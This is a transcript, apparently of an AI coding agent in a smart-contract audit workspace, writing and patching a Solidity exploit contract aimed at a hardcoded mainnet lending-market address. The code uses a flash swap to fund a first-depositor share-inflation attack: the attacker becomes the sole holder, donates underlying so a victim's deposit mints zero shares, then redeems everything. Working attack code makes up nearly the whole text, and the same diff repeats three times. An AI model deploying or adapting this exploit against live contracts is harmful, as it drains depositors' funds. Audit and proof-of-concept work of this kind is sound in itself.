+-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+-}
+-
+-contract VictimMinter {
+-    constructor() {}
+-
+-    function supplyAndMint(address underlying, address market, uint256 amount) external {
+-        _forceApprove(underlying, market, 0);
+-        _forceApprove(underlying, market, amount);
+-
+-        uint256 err = IOErc20Like(market).mint(amount);
+-        require(err == 0, "victim mint failed");
+-    }
+-
+-    function _forceApprove(address token, address spender, uint256 amount) internal {
+-        (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+-    }
+-}
+-
+-contract FlawVerifier {
+-    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+-    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+-        IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
+-
+-    bool public attempted;
+-    bool public hypothesisValidated;
+-    uint256 public seedAmountUsed;
+-    uint256 public donationAmountUsed;
+-    uint256 public victimMintAmountUsed;
+-    uint256 public attackerSharesBeforeRedeem;
+-    string public lastFailureReason;
+-
+-    address private _profitToken;
+-    uint256 private _profitAmount;
+-
+-    bool private _inFlashCallback;
+-
+-    constructor() {}
+-
+-    function executeOnOpportunity() external {
+-        if (attempted) {
+-            return;
+-        }
+-        attempted = true;
+-
+-        address underlying = TARGET.underlying();
+-        _profitToken = underlying;
+-
+-        uint256 existingSupply = TARGET.totalSupply();
+-        if (existingSupply != 0) {
+-            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
+-            return;
+-        }
+-
+-        uint256 strandedCash = TARGET.getCash();
+-        if (strandedCash == 0) {
+-            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
+-            return;
+-        }
+-
+-        uint256 seed = _minimumSeedAmount();
+-        if (seed == 0) {
+-            lastFailureReason = "invalid seed amount";
+-            return;
+-        }
+-
+-        _flashBorrowSeed(underlying, seed);
+-
+-        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+-        _profitAmount = finalUnderlyingBalance;
+-        if (_profitAmount == 0) {
+-            lastFailureReason = "execution completed without positive realized underlying";
+-        }
+-    }
+-
+-    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+-        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
+-        require(sender == address(this), "unexpected sender");
+-        require(!_inFlashCallback, "callback reentered");
+-
+-        _inFlashCallback = true;
+-
+-        address underlying = TARGET.underlying();
+-        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
+-        require(borrowedAmount > 0, "zero flash amount");
+-
+-        _forceApprove(underlying, address(TARGET), 0);
+-        _forceApprove(underlying, address(TARGET), type(uint256).max);
+-
+-        // Bootstrap: with totalSupply == 0, a tiny flash-borrowed seed can mint the first shares and
+-        // immediately redeem all pre-existing raw cash already sitting in the market. That public cash
+-        // becomes the working capital used for the documented four-stage F-001 path below.
+-        uint256 bootstrapSeed = borrowedAmount;
+-        uint256 mintErr = TARGET.mint(bootstrapSeed);
+-        require(mintErr == 0, "bootstrap mint failed");
+-
+-        uint256 bootstrapShares = TARGET.balanceOf(address(this));
+-        require(bootstrapShares > 0, "bootstrap shares zero");
+-
+-        uint256 redeemErr = TARGET.redeem(bootstrapShares);
+-        require(redeemErr == 0, "bootstrap redeem failed");
+-
+-        uint256 flashRepayment = _getV2RepaymentQuote(borrowedAmount);
+-        _safeTransfer(underlying, address(PEPE_WETH_V2_PAIR), flashRepayment);
+-
+-        _runCoreExploitPath(underlying);
+-
+-        _inFlashCallback = false;
+-    }
+-
+-    function profitToken() external view returns (address) {
+-        return _profitToken;
+-    }
+-
+-    function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
+-    }
+-
+-    function _runCoreExploitPath(address underlying) internal {
+-        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+-        require(initialUnderlyingBalance > 1, "bootstrap cash too small");
+-
+-        uint256 seed = _minimumSeedAmount();
+-        require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+-
+-        // Path stage 1: attacker mints a minimal amount to become the only oToken holder.
+-        uint256 mintErr = TARGET.mint(seed);
+-        require(mintErr == 0, "seed mint failed");
+-        seedAmountUsed = seed;
+-
+-        uint256 attackerShares = TARGET.balanceOf(address(this));
+-        attackerSharesBeforeRedeem = attackerShares;
+-        require(attackerShares > 0, "seed mint returned zero shares");
+-
+-        // Stage 2 requires a direct underlying donation that raises the exchange rate
+-        // without increasing totalSupply. We keep the victim deposit to 1 wei so the path
+-        // remains minimal and deterministic; the economic profit here comes from the market's
+-        // already-stranded underlying captured during bootstrap, not from self-funding the victim.
+-        uint256 victimDeposit = 1;
+-        uint256 donationNeeded;
+-        if (attackerShares >= seed) {
+-            donationNeeded = attackerShares - seed + 1;
+-        } else {
+-            donationNeeded = 1;
+-        }
+-
+-        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+-        require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+-
+-        _safeTransfer(underlying, address(TARGET), donationNeeded);
+-        donationAmountUsed = donationNeeded;
+-
+-        VictimMinter victim = new VictimMinter();
+-        _safeTransfer(underlying, address(victim), victimDeposit);
+-        victimMintAmountUsed = victimDeposit;
+-
+-        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+-        uint256 cashBeforeVictimMint = TARGET.getCash();
+-
+-        // Path stage 3: victim mints after the donation and receives zero oTokens because
+-        // mintTokens = floor(actualMintAmount / exchangeRate) and the implementation never
+-        // rejects mintTokens == 0.
+-        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+-
+-        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+-        uint256 cashAfterVictimMint = TARGET.getCash();
+-        require(victimSharesAfter == victimSharesBefore, "victim received shares");
+-        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+-
+-        // Path stage 4: attacker redeems the sole existing shares and withdraws both the
+-        // direct donation and the victim's deposit.
+-        uint256 redeemErr = TARGET.redeem(attackerShares);
+-        require(redeemErr == 0, "attacker redeem failed");
+-
+-        hypothesisValidated = true;
+-    }
+-
+-    function _flashBorrowSeed(address underlying, uint256 seed) internal {
+-        address token0 = PEPE_WETH_V2_PAIR.token0();
+-        address token1 = PEPE_WETH_V2_PAIR.token1();
+-
+-        if (token0 == underlying) {
+-            PEPE_WETH_V2_PAIR.swap(seed, 0, address(this), hex"01");
+-            return;
+-        }
+-        if (token1 == underlying) {
+-            PEPE_WETH_V2_PAIR.swap(0, seed, address(this), hex"01");
+-            return;
+-        }
+-
+-        revert("configured pair does not contain underlying");
+-    }
+-
+-    function _minimumSeedAmount() internal view returns (uint256) {
+-        uint256 exchangeRate = TARGET.exchangeRateStored();
+-        uint256 seed = exchangeRate / 1e18;
+-        if (exchangeRate % 1e18 != 0) {
+-            seed += 1;
+-        }
+-        if (seed == 0) {
+-            seed = 1;
+-        }
+-        return seed;
+-    }
+-
+-    function _getV2RepaymentQuote(uint256 amountOut) internal pure returns (uint256) {
+-        return ((amountOut * 1000) / 997) + 1;
+-    }
+-
+-    function _forceApprove(address token, address spender, uint256 amount) internal {
+-        (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+-    }
+-
+-    function _safeTransfer(address token, address to, uint256 amount) internal {
+-        (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+-        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+-    }
+-}
+
+apply patch
+patch: completed
+/Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src/FlawVerifier.sol
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 944da17f108ec0c042a3caf7b2acdac26e87dd0a..99ec310ea26fae0300645f73f7d67bb74707b2d1
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -44,7 +44,7 @@
+ contract FlawVerifier {
+     IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+     IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+-        IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
++        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
+ 
+     bool public attempted;
+     bool public hypothesisValidated;
+@@ -111,11 +111,11 @@
+         _forceApprove(underlying, address(TARGET), 0);
+         _forceApprove(underlying, address(TARGET), type(uint256).max);
+ 
+-        // Bootstrap: with totalSupply == 0, a tiny flash-borrowed seed can mint the first shares and
+-        // immediately redeem all pre-existing raw cash already sitting in the market. That public cash
+-        // becomes the working capital used for the documented four-stage F-001 path below.
+-        uint256 bootstrapSeed = borrowedAmount;
+-        uint256 mintErr = TARGET.mint(bootstrapSeed);
++        // Realistic funding step required by this attempt: a V2 flashswap supplies only the minimal
++        // bootstrap seed. Because totalSupply == 0, minting then redeeming that seed legally extracts
++        // the market's already-stranded on-chain underlying into attacker working capital, which is
++        // then used to execute the documented donation -> victim zero-share mint -> attacker redeem path.
++        uint256 mintErr = TARGET.mint(borrowedAmount);
+         require(mintErr == 0, "bootstrap mint failed");
+ 
+         uint256 bootstrapShares = TARGET.balanceOf(address(this));
+@@ -147,7 +147,7 @@
+         uint256 seed = _minimumSeedAmount();
+         require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+ 
+-        // Path stage 1: attacker mints a minimal amount to become the only oToken holder.
++        // Stage 1: attacker becomes the sole shareholder with the minimum viable mint.
+         uint256 mintErr = TARGET.mint(seed);
+         require(mintErr == 0, "seed mint failed");
+         seedAmountUsed = seed;
+@@ -156,17 +156,11 @@
+         attackerSharesBeforeRedeem = attackerShares;
+         require(attackerShares > 0, "seed mint returned zero shares");
+ 
+-        // Stage 2 requires a direct underlying donation that raises the exchange rate
+-        // without increasing totalSupply. We keep the victim deposit to 1 wei so the path
+-        // remains minimal and deterministic; the economic profit here comes from the market's
+-        // already-stranded underlying captured during bootstrap, not from self-funding the victim.
++        // Stage 2: attacker donates underlying directly to the market, inflating getCash without
++        // increasing totalSupply. The victim deposit is kept at 1 unit so the causality stays minimal:
++        // the donation is what pushes the exchange rate high enough that the victim receives zero shares.
+         uint256 victimDeposit = 1;
+-        uint256 donationNeeded;
+-        if (attackerShares >= seed) {
+-            donationNeeded = attackerShares - seed + 1;
+-        } else {
+-            donationNeeded = 1;
+-        }
++        uint256 donationNeeded = attackerShares >= seed ? (attackerShares - seed + 1) : 1;
+ 
+         uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+         require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+@@ -181,9 +175,8 @@
+         uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+         uint256 cashBeforeVictimMint = TARGET.getCash();
+ 
+-        // Path stage 3: victim mints after the donation and receives zero oTokens because
+-        // mintTokens = floor(actualMintAmount / exchangeRate) and the implementation never
+-        // rejects mintTokens == 0.
++        // Stage 3: victim mints after the donation. Since mintTokens floors to zero and the market
++        // does not reject that outcome, the victim loses underlying and receives no oTokens.
+         victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+ 
+         uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+@@ -191,10 +184,10 @@
+         require(victimSharesAfter == victimSharesBefore, "victim received shares");
+         require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+ 
+-        // Path stage 4: attacker redeems the sole existing shares and withdraws both the
+-        // direct donation and the victim's deposit.
+-        uint256 redeemErr = TARGET.redeem(attackerShares);
+-        require(redeemErr == 0, "attacker redeem failed");
++        // Stage 4: attacker redeems the only outstanding shares and exits with the donation plus
++        // the victim's stranded deposit.
++        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
++        require(redeemFinalErr == 0, "attacker redeem failed");
+ 
+         hypothesisValidated = true;
+     }
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 944da17f108ec0c042a3caf7b2acdac26e87dd0a..99ec310ea26fae0300645f73f7d67bb74707b2d1
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -44,7 +44,7 @@
+ contract FlawVerifier {
+     IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+     IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+-        IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
++        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
+ 
+     bool public attempted;
+     bool public hypothesisValidated;
+@@ -111,11 +111,11 @@
+         _forceApprove(underlying, address(TARGET), 0);
+         _forceApprove(underlying, address(TARGET), type(uint256).max);
+ 
+-        // Bootstrap: with totalSupply == 0, a tiny flash-borrowed seed can mint the first shares and
+-        // immediately redeem all pre-existing raw cash already sitting in the market. That public cash
+-        // becomes the working capital used for the documented four-stage F-001 path below.
+-        uint256 bootstrapSeed = borrowedAmount;
+-        uint256 mintErr = TARGET.mint(bootstrapSeed);
++        // Realistic funding step required by this attempt: a V2 flashswap supplies only the minimal
++        // bootstrap seed. Because totalSupply == 0, minting then redeeming that seed legally extracts
++        // the market's already-stranded on-chain underlying into attacker working capital, which is
++        // then used to execute the documented donation -> victim zero-share mint -> attacker redeem path.
++        uint256 mintErr = TARGET.mint(borrowedAmount);
+         require(mintErr == 0, "bootstrap mint failed");
+ 
+         uint256 bootstrapShares = TARGET.balanceOf(address(this));
+@@ -147,7 +147,7 @@
+         uint256 seed = _minimumSeedAmount();
+         require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+ 
+-        // Path stage 1: attacker mints a minimal amount to become the only oToken holder.
++        // Stage 1: attacker becomes the sole shareholder with the minimum viable mint.
+         uint256 mintErr = TARGET.mint(seed);
+         require(mintErr == 0, "seed mint failed");
+         seedAmountUsed = seed;
+@@ -156,17 +156,11 @@
+         attackerSharesBeforeRedeem = attackerShares;
+         require(attackerShares > 0, "seed mint returned zero shares");
+ 
+-        // Stage 2 requires a direct underlying donation that raises the exchange rate
+-        // without increasing totalSupply. We keep the victim deposit to 1 wei so the path
+-        // remains minimal and deterministic; the economic profit here comes from the market's
+-        // already-stranded underlying captured during bootstrap, not from self-funding the victim.
++        // Stage 2: attacker donates underlying directly to the market, inflating getCash without
++        // increasing totalSupply. The victim deposit is kept at 1 unit so the causality stays minimal:
++        // the donation is what pushes the exchange rate high enough that the victim receives zero shares.
+         uint256 victimDeposit = 1;
+-        uint256 donationNeeded;
+-        if (attackerShares >= seed) {
+-            donationNeeded = attackerShares - seed + 1;
+-        } else {
+-            donationNeeded = 1;
+-        }
++        uint256 donationNeeded = attackerShares >= seed ? (attackerShares - seed + 1) : 1;
+ 
+         uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+         require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+@@ -181,9 +175,8 @@
+         uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+         uint256 cashBeforeVictimMint = TARGET.getCash();
+ 
+-        // Path stage 3: victim mints after the donation and receives zero oTokens because
+-        // mintTokens = floor(actualMintAmount / exchangeRate) and the implementation never
+-        // rejects mintTokens == 0.
++        // Stage 3: victim mints after the donation. Since mintTokens floors to zero and the market
++        // does not reject that outcome, the victim loses underlying and receives no oTokens.
+         victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+ 
+         uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+@@ -191,10 +184,10 @@
+         require(victimSharesAfter == victimSharesBefore, "victim received shares");
+         require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+ 
+-        // Path stage 4: attacker redeems the sole existing shares and withdraws both the
+-        // direct donation and the victim's deposit.
+-        uint256 redeemErr = TARGET.redeem(attackerShares);
+-        require(redeemErr == 0, "attacker redeem failed");
++        // Stage 4: attacker redeems the only outstanding shares and exits with the donation plus
++        // the victim's stranded deposit.
++        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
++        require(redeemFinalErr == 0, "attacker redeem failed");
+ 
+         hypothesisValidated = true;
+     }
+
+codex
+The patch is in place. I’m doing a quick local compile check on the standalone file now so I can catch any syntax or interface mistakes before I return the final Solidity.
+exec
+/bin/bash -lc 'solc --version' in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ exited 127 in 0ms:
+/bin/bash: solc: command not found
+
+exec
+/bin/bash -lc "sed -n '1,260p' FlawVerifier.sol" in /Users/zhanglongqin/AuditHoundV2/cases/onyxprotocol/src
+ succeeded in 0ms:
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IOErc20Like {
+    function underlying() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address owner) external view returns (uint256);
+    function getCash() external view returns (uint256);
+    function exchangeRateStored() external view returns (uint256);
+    function mint(uint256 mintAmount) external returns (uint256);
+    function redeem(uint256 redeemTokens) external returns (uint256);
+}
+
+interface IUniswapV2PairLike {
+    function token0() external view returns (address);
+    function token1() external view returns (address);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+contract VictimMinter {
+    constructor() {}
+
+    function supplyAndMint(address underlying, address market, uint256 amount) external {
+        _forceApprove(underlying, market, 0);
+        _forceApprove(underlying, market, amount);
+
+        uint256 err = IOErc20Like(market).mint(amount);
+        require(err == 0, "victim mint failed");
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+}
+
+contract FlawVerifier {
+    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
+
+    bool public attempted;
+    bool public hypothesisValidated;
+    uint256 public seedAmountUsed;
+    uint256 public donationAmountUsed;
+    uint256 public victimMintAmountUsed;
+    uint256 public attackerSharesBeforeRedeem;
+    string public lastFailureReason;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    bool private _inFlashCallback;
+
+    constructor() {}
+
+    function executeOnOpportunity() external {
+        if (attempted) {
+            return;
+        }
+        attempted = true;
+
+        address underlying = TARGET.underlying();
+        _profitToken = underlying;
+
+        uint256 existingSupply = TARGET.totalSupply();
+        if (existingSupply != 0) {
+            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
+            return;
+        }
+
+        uint256 strandedCash = TARGET.getCash();
+        if (strandedCash == 0) {
+            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
+            return;
+        }
+
+        uint256 seed = _minimumSeedAmount();
+        if (seed == 0) {
+            lastFailureReason = "invalid seed amount";
+            return;
+        }
+
+        _flashBorrowSeed(underlying, seed);
+
+        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        _profitAmount = finalUnderlyingBalance;
+        if (_profitAmount == 0) {
+            lastFailureReason = "execution completed without positive realized underlying";
+        }
+    }
+
+    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
+        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
+        require(sender == address(this), "unexpected sender");
+        require(!_inFlashCallback, "callback reentered");
+
+        _inFlashCallback = true;
+
+        address underlying = TARGET.underlying();
+        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
+        require(borrowedAmount > 0, "zero flash amount");
+
+        _forceApprove(underlying, address(TARGET), 0);
+        _forceApprove(underlying, address(TARGET), type(uint256).max);
+
+        // Realistic funding step required by this attempt: a V2 flashswap supplies only the minimal
+        // bootstrap seed. Because totalSupply == 0, minting then redeeming that seed legally extracts
+        // the market's already-stranded on-chain underlying into attacker working capital, which is
+        // then used to execute the documented donation -> victim zero-share mint -> attacker redeem path.
+        uint256 mintErr = TARGET.mint(borrowedAmount);
+        require(mintErr == 0, "bootstrap mint failed");
+
+        uint256 bootstrapShares = TARGET.balanceOf(address(this));
+        require(bootstrapShares > 0, "bootstrap shares zero");
+
+        uint256 redeemErr = TARGET.redeem(bootstrapShares);
+        require(redeemErr == 0, "bootstrap redeem failed");
+
+        uint256 flashRepayment = _getV2RepaymentQuote(borrowedAmount);
+        _safeTransfer(underlying, address(PEPE_WETH_V2_PAIR), flashRepayment);
+
+        _runCoreExploitPath(underlying);
+
+        _inFlashCallback = false;
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _runCoreExploitPath(address underlying) internal {
+        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
+        require(initialUnderlyingBalance > 1, "bootstrap cash too small");
+
+        uint256 seed = _minimumSeedAmount();
+        require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+
+        // Stage 1: attacker becomes the sole shareholder with the minimum viable mint.
+        uint256 mintErr = TARGET.mint(seed);
+        require(mintErr == 0, "seed mint failed");
+        seedAmountUsed = seed;
+
+        uint256 attackerShares = TARGET.balanceOf(address(this));
+        attackerSharesBeforeRedeem = attackerShares;
+        require(attackerShares > 0, "seed mint returned zero shares");
+
+        // Stage 2: attacker donates underlying directly to the market, inflating getCash without
+        // increasing totalSupply. The victim deposit is kept at 1 unit so the causality stays minimal:
+        // the donation is what pushes the exchange rate high enough that the victim receives zero shares.
+        uint256 victimDeposit = 1;
+        uint256 donationNeeded = attackerShares >= seed ? (attackerShares - seed + 1) : 1;
+
+        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+        require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+
+        _safeTransfer(underlying, address(TARGET), donationNeeded);
+        donationAmountUsed = donationNeeded;
+
+        VictimMinter victim = new VictimMinter();
+        _safeTransfer(underlying, address(victim), victimDeposit);
+        victimMintAmountUsed = victimDeposit;
+
+        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+        uint256 cashBeforeVictimMint = TARGET.getCash();
+
+        // Stage 3: victim mints after the donation. Since mintTokens floors to zero and the market
+        // does not reject that outcome, the victim loses underlying and receives no oTokens.
+        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+
+        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+        uint256 cashAfterVictimMint = TARGET.getCash();
+        require(victimSharesAfter == victimSharesBefore, "victim received shares");
+        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+
+        // Stage 4: attacker redeems the only outstanding shares and exits with the donation plus
+        // the victim's stranded deposit.
+        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
+        require(redeemFinalErr == 0, "attacker redeem failed");
+
+        hypothesisValidated = true;
+    }
+
+    function _flashBorrowSeed(address underlying, uint256 seed) internal {
+        address token0 = PEPE_WETH_V2_PAIR.token0();
+        address token1 = PEPE_WETH_V2_PAIR.token1();
+
+        if (token0 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(seed, 0, address(this), hex"01");
+            return;
+        }
+        if (token1 == underlying) {
+            PEPE_WETH_V2_PAIR.swap(0, seed, address(this), hex"01");
+            return;
+        }
+
+        revert("configured pair does not contain underlying");
+    }
+
+    function _minimumSeedAmount() internal view returns (uint256) {
+        uint256 exchangeRate = TARGET.exchangeRateStored();
+        uint256 seed = exchangeRate / 1e18;
+        if (exchangeRate % 1e18 != 0) {
+            seed += 1;
+        }
+        if (seed == 0) {
+            seed = 1;
+        }
+        return seed;
+    }
+
+    function _getV2RepaymentQuote(uint256 amountOut) internal pure returns (uint256) {
+        return ((amountOut * 1000) / 997) + 1;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) =
+            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+}
+
+diff --git a/FlawVerifier.sol b/FlawVerifier.sol
+index 944da17f108ec0c042a3caf7b2acdac26e87dd0a..99ec310ea26fae0300645f73f7d67bb74707b2d1
+--- a/FlawVerifier.sol
++++ b/FlawVerifier.sol
+@@ -44,7 +44,7 @@
+ contract FlawVerifier {
+     IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
+     IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
+-        IUniswapV2PairLike(0xA43fE16908251ee70EF74718545e4FE6C5cCEc9f);
++        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
+ 
+     bool public attempted;
+     bool public hypothesisValidated;
+@@ -111,11 +111,11 @@
+         _forceApprove(underlying, address(TARGET), 0);
+         _forceApprove(underlying, address(TARGET), type(uint256).max);
+ 
+-        // Bootstrap: with totalSupply == 0, a tiny flash-borrowed seed can mint the first shares and
+-        // immediately redeem all pre-existing raw cash already sitting in the market. That public cash
+-        // becomes the working capital used for the documented four-stage F-001 path below.
+-        uint256 bootstrapSeed = borrowedAmount;
+-        uint256 mintErr = TARGET.mint(bootstrapSeed);
++        // Realistic funding step required by this attempt: a V2 flashswap supplies only the minimal
++        // bootstrap seed. Because totalSupply == 0, minting then redeeming that seed legally extracts
++        // the market's already-stranded on-chain underlying into attacker working capital, which is
++        // then used to execute the documented donation -> victim zero-share mint -> attacker redeem path.
++        uint256 mintErr = TARGET.mint(borrowedAmount);
+         require(mintErr == 0, "bootstrap mint failed");
+ 
+         uint256 bootstrapShares = TARGET.balanceOf(address(this));
+@@ -147,7 +147,7 @@
+         uint256 seed = _minimumSeedAmount();
+         require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");
+ 
+-        // Path stage 1: attacker mints a minimal amount to become the only oToken holder.
++        // Stage 1: attacker becomes the sole shareholder with the minimum viable mint.
+         uint256 mintErr = TARGET.mint(seed);
+         require(mintErr == 0, "seed mint failed");
+         seedAmountUsed = seed;
+@@ -156,17 +156,11 @@
+         attackerSharesBeforeRedeem = attackerShares;
+         require(attackerShares > 0, "seed mint returned zero shares");
+ 
+-        // Stage 2 requires a direct underlying donation that raises the exchange rate
+-        // without increasing totalSupply. We keep the victim deposit to 1 wei so the path
+-        // remains minimal and deterministic; the economic profit here comes from the market's
+-        // already-stranded underlying captured during bootstrap, not from self-funding the victim.
++        // Stage 2: attacker donates underlying directly to the market, inflating getCash without
++        // increasing totalSupply. The victim deposit is kept at 1 unit so the causality stays minimal:
++        // the donation is what pushes the exchange rate high enough that the victim receives zero shares.
+         uint256 victimDeposit = 1;
+-        uint256 donationNeeded;
+-        if (attackerShares >= seed) {
+-            donationNeeded = attackerShares - seed + 1;
+-        } else {
+-            donationNeeded = 1;
+-        }
++        uint256 donationNeeded = attackerShares >= seed ? (attackerShares - seed + 1) : 1;
+ 
+         uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
+         require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");
+@@ -181,9 +175,8 @@
+         uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
+         uint256 cashBeforeVictimMint = TARGET.getCash();
+ 
+-        // Path stage 3: victim mints after the donation and receives zero oTokens because
+-        // mintTokens = floor(actualMintAmount / exchangeRate) and the implementation never
+-        // rejects mintTokens == 0.
++        // Stage 3: victim mints after the donation. Since mintTokens floors to zero and the market
++        // does not reject that outcome, the victim loses underlying and receives no oTokens.
+         victim.supplyAndMint(underlying, address(TARGET), victimDeposit);
+ 
+         uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
+@@ -191,10 +184,10 @@
+         require(victimSharesAfter == victimSharesBefore, "victim received shares");
+         require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");
+ 
+-        // Path stage 4: attacker redeems the sole existing shares and withdraws both the
+-        // direct donation and the victim's deposit.
+-        uint256 redeemErr = TARGET.redeem(attackerShares);
+-        require(redeemErr == 0, "attacker redeem failed");
++        // Stage 4: attacker redeems the only outstanding shares and exits with the donation plus
++        // the victim's stranded deposit.
++        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
++        require(redeemFinalErr == 0, "attacker redeem failed");
+ 
+         hypothesisValidated = true;
+     }
+
+codex
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IOErc20Like {
+    function underlying() external view returns (address);
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address owner) external view returns (uint256);
+    function getCash() external view returns (uint256);
